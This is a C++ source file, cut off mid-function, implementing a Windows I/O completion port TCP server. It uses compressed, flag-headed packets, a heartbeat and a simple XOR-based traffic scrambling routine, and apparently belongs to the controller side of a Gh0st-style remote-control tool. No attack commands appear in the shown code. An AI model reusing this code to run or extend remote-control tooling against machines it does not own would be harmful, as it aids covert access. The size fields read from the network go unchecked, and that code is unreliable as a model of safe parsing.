// IOCPServer.cpp: implementation of the CIOCPServer class.
//
//////////////////////////////////////////////////////////////////////

#include "../stdafx.h"
#include "IOCPServer.h"
#include "../MainFrm.h"

#include "zlib/zlib.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

// Change at your Own Peril

#define HDR_SIZE	15

#define ZLIB_NO  0001		//数据包无压缩模式
#define ZLIB_OK  0002		//数据包为压缩模式

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CIOCPServer
// 
// DESCRIPTION:	C'tor initializes Winsock2 and miscelleanous events etc.
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CIOCPServer::CIOCPServer()
{
	TRACE("CIOCPServer=%p\n",this);	
	
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);
	
	InitializeCriticalSection(&m_cs);
	
	m_hThread		= NULL;
	m_hKillEvent	= CreateEvent(NULL, TRUE, FALSE, NULL);
	m_socListen		= NULL;
	
	m_bTimeToKill		= false;
	m_bDisconnectAll	= false;
	
	m_hEvent		= NULL;
	m_hCompletionPort= NULL;
	
	m_bInit = false;
	
	m_nSendKbps = 0;
	m_nRecvKbps = 0;
	m_dwIndex   = 0;
	m_nMaxConnections = 10000;
	m_nKeepLiveTime = 1000 * 60 * 3; // 三分钟探测一次

	m_nHeartBeatTime = 0;

	// Packet Flag;
	BYTE bPacketFlag[] = {'h', 'x', ' '};
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));


}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CIOCPServer
// 
// DESCRIPTION:	Tidy up
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CIOCPServer::~CIOCPServer()
{
	try
	{
		Shutdown();
		WSACleanup();
	}catch(...){}
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Init
// 
// DESCRIPTION:	Starts listener into motion
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, int nMaxConnections, int nPort)
{
	m_pNotifyProc	= pNotifyProc;
	m_nMaxConnections = nMaxConnections;
	m_socListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);
	
	
	if (m_socListen == INVALID_SOCKET)
	{
		TRACE(_T("Could not create listen socket %ld\n"),WSAGetLastError());
		return false;
	}
	
	// Event for handling Network IO
	m_hEvent = WSACreateEvent();
	
	if (m_hEvent == WSA_INVALID_EVENT)
	{
		TRACE(_T("WSACreateEvent() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}
	
	// The listener is ONLY interested in FD_ACCEPT
	// That is when a client connects to or IP/Port
	// Request async notification
	int nRet = WSAEventSelect(m_socListen,
						  m_hEvent,
						  FD_ACCEPT);
	
	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("WSAAsyncSelect() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}
	
	SOCKADDR_IN		saServer;		
	
	
	// Listen on our designated Port#
	saServer.sin_port = htons(nPort);
	
	// Fill in the rest of the address structure
	saServer.sin_family = AF_INET;
	saServer.sin_addr.s_addr = INADDR_ANY;
	
	// bind our name to the socket
	nRet = bind(m_socListen, 
		(LPSOCKADDR)&saServer, 
		sizeof(struct sockaddr));
	
	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("bind() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}
	
	// Set the socket to listen
	nRet = listen(m_socListen, SOMAXCONN);
	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("listen() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}
	
	
	////////////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////////////
	UINT	dwThreadId = 0;
	
	m_hThread =
		(HANDLE)_beginthreadex(NULL,				// Security
		0,					// Stack size - use default
		ListenThreadProc,  // Thread fn entry point
		(void*) this,	    
		0,					// Init flag
		&dwThreadId);	// Thread address
	
	if (m_hThread != INVALID_HANDLE_VALUE)
	{
		InitializeIOCP();
		m_bInit = true;
		return true;
	}
	
	
	
	return false;
}

unsigned CIOCPServer::ThreadHeartbeat (LPVOID thisContext)    
{
	// Get back our pointer to the class
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(thisContext);
	ASSERT(pThis);
	
	ClientContext* pContext = NULL;
	
	while (pThis->m_bTimeToKill == false) 
	{
		// 为了最快响应关闭IOCP消息, 检测间隔为1分钟
		for (int i = 0; i < 60 * pThis->m_nHeartBeatTime && pThis->m_bTimeToKill == false; i++)
			Sleep(1000);

		// Thread is Block waiting for IO completion
		POSITION pos  = pThis->m_listContexts.GetHeadPosition();
		while (pos)
		{
			pContext = pThis->m_listContexts.GetNext(pos);
			
			// 只对主socket进行心跳超时检测
			if (pContext->m_bIsMainSocket)
			{
				BYTE bToken = 0XFF;
				pThis->Send(pContext, &bToken, sizeof(bToken));
				Sleep(5);
			}
		}
    }
	
   	return 0;
} 
////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::ListenThreadProc
// 
// DESCRIPTION:	Listens for incoming clients
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
unsigned CIOCPServer::ListenThreadProc(LPVOID lParam)
{
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(lParam);
	
	WSANETWORKEVENTS events;
	
	while(1)
	{
		//
		// Wait for something to happen
		//
        if (WaitForSingleObject(pThis->m_hKillEvent, 100) == WAIT_OBJECT_0)
            break;
		
		DWORD dwRet;
		dwRet = WSAWaitForMultipleEvents(1,
			&pThis->m_hEvent,
			FALSE,
			100,
			FALSE);
		
		if (dwRet == WSA_WAIT_TIMEOUT)
			continue;
		
		//
		// Figure out what happened
		//
		int nRet = WSAEnumNetworkEvents(pThis->m_socListen,
			pThis->m_hEvent,
			&events);
		
		if (nRet == SOCKET_ERROR)
		{
			TRACE(_T("WSAEnumNetworkEvents error %ld\n"),WSAGetLastError());
			break;
		}
		
		// Handle Network events //
		// ACCEPT
		if (events.lNetworkEvents & FD_ACCEPT)
		{
			if (events.iErrorCode[FD_ACCEPT_BIT] == 0)
				pThis->OnAccept();
			else
			{
				TRACE(_T("Unknown network event error %ld\n"),WSAGetLastError());
				break;
			}
			
		}
		
	} // while....
	
	return 0; // Normal Thread Exit Code...
}
////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnAccept
// 
// DESCRIPTION:	Listens for incoming clients
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09072001			   Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::OnAccept()
{
	SOCKADDR_IN	SockAddr;
	SOCKET		clientSocket;
	
	int			nRet;
	int			nLen;
	
	if (m_bTimeToKill || m_bDisconnectAll)
		return;
	
	//
	// accept the new socket descriptor
	//
	nLen = sizeof(SOCKADDR_IN);
	clientSocket = accept(m_socListen,
		(LPSOCKADDR)&SockAddr,
		&nLen); 
	
	if (clientSocket == SOCKET_ERROR)
	{
		nRet = WSAGetLastError();
		if (nRet != WSAEWOULDBLOCK)
		{
			//
			// Just log the error and return
			//
			TRACE(_T("accept() error\n"),WSAGetLastError());
			return;
		}
	}
	
	// Create the Client context to be associted with the completion port
	ClientContext* pContext = AllocateContext();
	// AllocateContext fail
	if (pContext == NULL)
		return;
	
    pContext->m_Socket = clientSocket;
	
	// Fix up In Buffer
	pContext->m_wsaInBuffer.buf = (char*)pContext->m_byInBuffer;
	pContext->m_wsaInBuffer.len = sizeof(pContext->m_byInBuffer);
	
	// Associate the new socket with a completion port.
	if (!AssociateSocketWithCompletionPort(clientSocket, m_hCompletionPort, (DWORD) pContext))
    {
        delete pContext;
		pContext = NULL;
		
        closesocket( clientSocket );
        closesocket( m_socListen );
        return;
    }

    
	BOOL   bConditionalAccept=TRUE;   
	DWORD  dwBytes;
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(pContext->m_Socket, SOL_SOCKET, SO_KEEPALIVE, (const   char*)&bConditionalAccept, sizeof(BOOL)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = m_nKeepLiveTime; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
		WSAIoctl
			(
			pContext->m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			&dwBytes,
			0,
			NULL
			);
	}
	
	CLock cs(m_cs, "OnAccept" );
	// Hold a reference to the context
	m_listContexts.AddTail(pContext);
	

	// Trigger first IO Completion Request
	// Otherwise the Worker thread will remain blocked waiting for GetQueuedCompletionStatus...
	// The first message that gets queued up is ClientIoInitializing - see ThreadPoolFunc and 
	// IO_MESSAGE_HANDLER
	
	
	OVERLAPPEDPLUS	*pOverlap = new OVERLAPPEDPLUS(IOInitialize);
	
	BOOL bSuccess = PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) pContext, &pOverlap->m_ol);
	
	if ( (!bSuccess && GetLastError( ) != ERROR_IO_PENDING))
	{            
        RemoveStaleClient(pContext,TRUE);
		if (pOverlap)
		{
			delete pOverlap;
		}
		return;
    }
	
	m_pNotifyProc( pContext, NC_CLIENT_CONNECT);
	
	// Post to WSARecv Next
	PostRecv(pContext);
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::InitializeIOCP
// 
// DESCRIPTION:	Create a dummy socket and associate a completion port with it.
//				once completion port is create we can dicard the socket
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::InitializeIOCP(void)
{
    SOCKET s;
    DWORD i;
    UINT  nThreadID;
    SYSTEM_INFO systemInfo;
	
    //
    // First open a temporary socket that we will use to create the
    // completion port.  In NT 3.51 it will not be necessary to specify
    // the FileHandle parameter of CreateIoCompletionPort()--it will
    // be legal to specify FileHandle as NULL.  However, for NT 3.5
    // we need an overlapped file handle.
    //
	
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if ( s == INVALID_SOCKET ) 
        return false;
	
    // Create the completion port that will be used by all the worker
    // threads.
    m_hCompletionPort = CreateIoCompletionPort( (HANDLE)s, NULL, 0, 0 );
    if ( m_hCompletionPort == NULL ) 
	{
        closesocket( s );
        return false;
    }
	
    // Close the socket, we don't need it any longer.
    closesocket( s );
	
    // Determine how many processors are on the system.
    GetSystemInfo( &systemInfo );
	
    // We use two worker threads for eachprocessor on the system--this is choosen as a good balance
    // that ensures that there are a sufficient number of threads available to get useful work done 
	// but not too many that context switches consume significant overhead.
	UINT nWorkerCnt = systemInfo.dwNumberOfProcessors * 2 + 2;
	
	// We need to save the Handles for Later Termination...
	HANDLE hWorker;
	m_nWorkerCnt = 0;
	
    for ( i = 0; i < nWorkerCnt; i++ ) 
	{
		hWorker = (HANDLE)_beginthreadex(NULL,					// Security
			0,						// Stack size - use default
			ThreadPoolFunc,     		// Thread fn entry point
			(void*) this,			// Param for thread
			0,						// Init flag
			&nThreadID);			// Thread address
		
		
        if (hWorker == NULL ) 
		{
            CloseHandle( m_hCompletionPort );
            return false;
        }
		
		m_nWorkerCnt++;
		
		CloseHandle(hWorker);
    }
	
	if (m_nHeartBeatTime != 0)
	{
		hWorker = (HANDLE) _beginthreadex(NULL,					// Security
			0,						// Stack size - use default
			ThreadHeartbeat,     		// Thread fn entry point
			(void*) this,			// Param for thread
			0,						// Init flag
			&nThreadID);			// Thread address
		
		if (hWorker == NULL ) 
		{
			CloseHandle( m_hCompletionPort );
			return false;
		}
		
    	CloseHandle(hWorker);
	}

	return true;
} 

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::ThreadPoolFunc 
// 
// DESCRIPTION:	This is the main worker routine for the worker threads.  
//				Worker threads wait on a completion port for I/O to complete.  
//				When it completes, the worker thread processes the I/O, then either pends 
//				new I/O or closes the client's connection.  When the service shuts 
//				down, other code closes the completion port which causes 
//				GetQueuedCompletionStatus() to wake up and the worker thread then 
//				exits.
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09062001              Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
unsigned CIOCPServer::ThreadPoolFunc (LPVOID thisContext)    
{
	// Get back our pointer to the class
	ULONG ulFlags = MSG_PARTIAL;
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(thisContext);
	ASSERT(pThis);
	
    HANDLE hCompletionPort = pThis->m_hCompletionPort;
    
    DWORD dwIoSize;
    LPOVERLAPPED lpOverlapped;
    ClientContext* lpClientContext;
	OVERLAPPEDPLUS*	pOverlapPlus;
	bool			bError;
	BOOL bIORet;
	
	//
    // Loop round and round servicing I/O completions.
	// 
	
	for (BOOL bStayInPool = TRUE; bStayInPool && pThis->m_bTimeToKill == false; ) 
	{
		pOverlapPlus	= NULL;
		lpClientContext = NULL;
		bError			= false;
		
		// Get a completed IO request.
		bIORet = GetQueuedCompletionStatus(
			hCompletionPort,
			&dwIoSize,
			(LPDWORD) &lpClientContext,
			&lpOverlapped, INFINITE);
		
		DWORD dwIOError = GetLastError();
		pOverlapPlus = CONTAINING_RECORD(lpOverlapped, OVERLAPPEDPLUS, m_ol);
		
		
        if (!bIORet && dwIOError != WAIT_TIMEOUT )
		{
			if (lpClientContext && pThis->m_bTimeToKill == false)
			{
				pThis->RemoveStaleClient(lpClientContext, FALSE);
				if(pOverlapPlus)
					delete pOverlapPlus; // from previous call
			}
			continue;
			
			// anyway, this was an error and we should exit
			bError = true;
		}
		
		//////////////////////////////////////////////////////////////////////////////////////////
		//////////////////////////////////////////////////////////////////////////////////////////
		if (!bError)
		{
			if(bIORet && NULL != pOverlapPlus && NULL != lpClientContext) 
			{
				try
				{
					pThis->ProcessIOMessage(pOverlapPlus->m_ioType, lpClientContext, dwIoSize);
				}
				catch (...) {}
			}
		}

		if(pOverlapPlus)
			delete pOverlapPlus; // from previous call
    }
	
	InterlockedDecrement(&pThis->m_nWorkerCnt);
	
   	return 0;
} 

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::Stop
// 
// DESCRIPTION:	Signal the listener to quit his thread
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::Stop()
{
    ::SetEvent(m_hKillEvent);
    WaitForSingleObject(m_hThread, INFINITE);
	CloseHandle(m_hThread);
    CloseHandle(m_hKillEvent);
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::GetHostName
// 
// DESCRIPTION:	Get the host name of the connect client
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CString CIOCPServer::GetHostName(SOCKET socket)
{
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	
	int nSockAddrLen = sizeof(sockAddr);
	
	BOOL bResult = getpeername(socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	return bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
}


void CIOCPServer::PostRecv(ClientContext* pContext)
{
	// issue a read request 
	OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IORead);
	ULONG			ulFlags = MSG_PARTIAL;
	DWORD			dwNumberOfBytesRecvd;
	UINT nRetVal = WSARecv(pContext->m_Socket, 
		&pContext->m_wsaInBuffer,
		1,
		&dwNumberOfBytesRecvd, 
		&ulFlags,
		&pOverlap->m_ol, 
		NULL);
	
	if ( nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING) 
	{
		RemoveStaleClient(pContext, FALSE);
		if (pOverlap)
		{
			delete pOverlap;
		}
	}
}
////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::Send
// 
// DESCRIPTION:	Posts a Write + Data to IO CompletionPort for transfer
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09062001			   Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
char* MyEncode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] ^= 0x19;
		data[i] -= 0x86;
	}
	return data;
}

void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize, BOOL bZlib)
{
	if (pContext == NULL)
		return;
	TRACE("1111111111111");

	if(pContext->m_WriteBuffer.GetBufferLen() != 0)
		return;

	TRACE("2222222222222");
	CLock cs(pContext->m_SndLock, "Send");
	TRACE("3333333333333");
/*
	// Wait for Data Ready signal to become available
	WaitForSingleObject(pContext->m_hWriteComplete, INFINITE);
*/

	try
	{
		if (nSize > 0)
		{
			// Compress data
			unsigned long	destLen = (double)nSize * 1.001  + 12;
			LPBYTE			pDest = new BYTE[destLen];
			if(bZlib == TRUE)  //发送数据需要压缩
			{
				//分配压缩数据的空间
				bZlib = ZLIB_OK;  //压缩数据
				int	nRet = compress(pDest, &destLen, lpData, nSize);                      //压缩数据
				if (nRet != Z_OK)
				{
					delete [] pDest;
					return;
				}
			}
			else   //发送数据不需要压缩
			{
				bZlib = ZLIB_NO;  //无压缩数据
				destLen = nSize;
				MoveMemory(pDest,lpData, nSize);
			}
			//////////////////////////////////////////////////////////////////////////
			LONG nBufLen = destLen + HDR_SIZE;
			// 5 bytes packet flag
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
			// 4 byte header [Size of Entire Packet]
			pContext->m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
			// 4 byte header [Size of UnCompress Entire Packet]
			pContext->m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
			// Writ  Zlib nFalg
			pContext->m_WriteBuffer.Write((PBYTE) &bZlib, sizeof(BOOL));             //写入数据是否压缩标志
			// Write Data
			pContext->m_WriteBuffer.Write(pDest, destLen);
			
			delete [] pDest;
			
			
			// 如果当前缓冲区无数据堆积，执行PostSend
			if (pContext->m_WriteBuffer.GetBufferLen() == nBufLen)
			{
				MyEncode((char *)pContext->m_WriteBuffer.GetBuffer(),pContext->m_WriteBuffer.GetBufferLen());
				PostSend(pContext);
			}
			else
			{
				TRACE("我操 卡了卡了 快看\r\n");
				return;
			}
			// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
			LPBYTE lpResendWriteBuffer = new BYTE[nSize];
			if(lpResendWriteBuffer == NULL)  return;
			CopyMemory(lpResendWriteBuffer, lpData, nSize);
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
			delete [] lpResendWriteBuffer;
		}
		else // 要求重发
		{
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
		}
		
	}catch(...){}
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CClientListener::OnClientInitializing
// 
// DESCRIPTION:	Called when client is initailizing
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientInitializing(ClientContext* pContext, DWORD dwIoSize)
{
	// We are not actually doing anything here, but we could for instance make
	// a call to Send() to send a greeting message or something
	
	return true;		// make sure to issue a read after this
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnClientReading
// 
// DESCRIPTION:	Called when client is reading 
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////

char* MyDecode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] += 0x86;
		data[i] ^= 0x19;
	}
	return data;
}


bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
{
	CLock cs(CIOCPServer::m_cs, "OnClientReading");
	try
	{
		//////////////////////////////////////////////////////////////////////////
		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;
		nBytes += dwIoSize;
		
		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nRecvKbps), nBytes);
			nBytes = 0;
		}
		//////////////////////////////////////////////////////////////////////////
		if (dwIoSize == 0)
		{
			RemoveStaleClient(pContext, FALSE);
			return false;
		}
		
		MyDecode((char *)pContext->m_byInBuffer,dwIoSize);
		
		if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送
			Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());
			// 必须再投递一个接收请求
			PostRecv(pContext);
			return true;
		}
		
		// 备份原始数据
		pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer,dwIoSize);
		
		m_pNotifyProc(pContext, NC_RECEIVE);
		
		// 检测数据大小
		while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			{
				CString str = GetHostName(pContext->m_Socket);
				TRACE(str);
				throw "bad buffer";
			}
			int nSize = 0;
			CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
			
			// Update Process Variable
			pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;
			
			if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				BOOL bZilb = FALSE;
				int nUnCompressLength = 0;
				// Read off header
				pContext->m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				pContext->m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				pContext->m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
				pContext->m_CompressionBuffer.Read((PBYTE) &bZilb, sizeof(BOOL));             //读取数据是否压缩
				
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad Allocate";
				
				pContext->m_CompressionBuffer.Read(pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				unsigned long	destLen = nUnCompressLength;
				if(bZilb == ZLIB_OK)   //数据需要解压缩
				{
					int nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
					//////////////////////////////////////////////////////////////////////////
					if (nRet == Z_OK)
					{
						pContext->m_DeCompressionBuffer.ClearBuffer();
						pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
						m_pNotifyProc( pContext, NC_RECEIVE_COMPLETE);
					}
					else
					{
						throw "bad buffer";
					}
				}
				else if(bZilb == ZLIB_NO)   //数据不需要解压缩
				{
					pContext->m_DeCompressionBuffer.ClearBuffer();
					pContext->m_DeCompressionBuffer.Write(pData, destLen);
					m_pNotifyProc( pContext, NC_RECEIVE_COMPLETE);
				}
				else
					throw "bad Buffer";
				
				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
			
		}
		// Post to WSARecv Next
		PostRecv(pContext);
 }
 catch (...)
 {
	 pContext->m_CompressionBuffer.ClearBuffer();
	 // 要求重发，就发送0, 内核自动添加数包标志
	 Send(pContext, NULL, 0, TRUE);
	 PostRecv(pContext);
 }
 
 return true;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnClientWriting
// 
// DESCRIPTION:	Called when client is writing
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////

void CIOCPServer::PostSend(ClientContext* pContext)
{	
	OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);
	
	ULONG ulFlags = MSG_PARTIAL;
	
	m_pNotifyProc( pContext, NC_TRANSMIT);
	
	pContext->m_wsaOutBuffer.buf = (char*) pContext->m_WriteBuffer.GetBuffer();
	pContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();
		
	int  nRetVal = WSASend(pContext->m_Socket, 
		&pContext->m_wsaOutBuffer,
		1,
		&pContext->m_wsaOutBuffer.len, 
		ulFlags,
		&pOverlap->m_ol, 
		NULL);
	
	if (nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING)
	{
		TRACE("发送失败\r\n");
		RemoveStaleClient( pContext, FALSE );
		if (pOverlap)	
			delete pOverlap;
	}
	
}

bool CIOCPServer::OnClientWriting(ClientContext* pContext, DWORD dwIoSize)
{
	try
	{
		//////////////////////////////////////////////////////////////////////////
		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;
		
		nBytes += dwIoSize;
		
		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nSendKbps), nBytes);
			nBytes = 0;
		}
		//////////////////////////////////////////////////////////////////////////
		// Finished writing - tidy up
		if (dwIoSize > 0)// Finished writing - tidy up
		{
			pContext->m_WriteBuffer.Delete(dwIoSize);
			
			if (pContext->m_WriteBuffer.GetBufferLen() > 0)
			{
				TRACE("数据堆积 继续投递\n");
				PostSend(pContext);
			}
			else
			{
				TRACE("发送完成 清空Buffer\n");
				pContext->m_WriteBuffer.ClearBuffer();
			}
//			SetEvent(pContext->m_hWriteComplete);
			
			return true;
		}
		
	}catch(...){}
	return false;			// issue new read after this one
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CloseCompletionPort
// 
// DESCRIPTION:	Close down the IO Complete Port, queue and associated client context structs
//				which in turn will close the sockets...
//				
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::CloseCompletionPort()
{
	
	while (m_nWorkerCnt)
	{
		PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) NULL, NULL);
		Sleep(100);
	}
	
	// Close the CompletionPort and stop any more requests
	CloseHandle(m_hCompletionPort);
	
	ClientContext* pContext = NULL;
	
	do 
	{
		POSITION pos  = m_listContexts.GetHeadPosition();
		if (pos)
		{
			pContext = m_listContexts.GetNext(pos);			
			RemoveStaleClient(pContext, FALSE);
		}
	}
	while (!m_listContexts.IsEmpty());
	
	m_listContexts.RemoveAll();
	
}


BOOL CIOCPServer::AssociateSocketWithCompletionPort(SOCKET socket, HANDLE hCompletionPort, DWORD dwCompletionKey)
{
	HANDLE h = CreateIoCompletionPort((HANDLE) socket, hCompletionPort, dwCompletionKey, 0);
	return h == hCompletionPort;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::RemoveStaleClient
// 
// DESCRIPTION:	Client has died on us, close socket and remove context from our list
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::RemoveStaleClient(ClientContext* pContext, BOOL bGraceful)
{
    CLock cs(m_cs, "RemoveStaleClient");
	
	TRACE("CIOCPServer::RemoveStaleClient\n");
	
    LINGER lingerStruct;
	
	
    //
    // If we're supposed to abort the connection, set the linger value
